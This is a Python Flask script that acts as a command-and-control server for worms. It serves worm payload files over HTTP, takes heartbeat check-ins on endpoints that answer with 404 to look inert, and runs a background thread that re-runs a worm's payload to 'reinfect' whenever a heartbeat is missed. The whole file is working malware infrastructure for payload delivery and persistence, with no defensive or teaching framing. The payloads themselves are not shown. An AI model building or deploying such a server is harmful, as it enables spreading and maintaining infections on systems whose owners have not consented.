#!/usr/bin/env python3
import logging
from flask import Flask, request, abort, send_file
import threading
import time
import subprocess
import os

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler()
    ]
)

app = Flask(__name__)

# Worm metadata
worms = {
    "6X9TQJ4P2M": {
        "last_ping": time.time(),
        "payload": "/app/worm1.py"
    },
    "Z4MPK7WQLE": {
        "last_ping": time.time(),
        "payload": "/app/worm2.py"
    }
}

# === Serve the worm payload ===
@app.route("/<worm_id>.py", methods=["GET"])
def serve_worm(worm_id):
    if worm_id in worms:
        path = worms[worm_id]["payload"]
        if os.path.isfile(path):
            return send_file(path)
    return abort(404)

# === C2 check-in endpoint ===
@app.route("/<worm_id>_c2", methods=["GET"])
def receive_ping(worm_id):
    if worm_id in worms:
        worms[worm_id]["last_ping"] = time.time()
    return abort(404)

# === Monitor worms ===
def monitor_worms():
    while True:
        time.sleep(65)
        now = time.time()

        for worm_id, meta in worms.items():
            if now - meta["last_ping"] > 60:
                logging.info(f"[!] {worm_id} missed heartbeat. Reinfecting...")
                try:
                    subprocess.run(["python3", meta["payload"]], check=True, env=os.environ)
                    logging.info(f"[+] Reinfection for {worm_id} attempted.")
                except Exception as e:
                    logging.warning(f"[!] Reinfection for {worm_id} failed: {e}")
            else:
                logging.info(f"[~] {worm_id} is alive.")

# Start reinfection monitor
threading.Thread(target=monitor_worms, daemon=True).start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
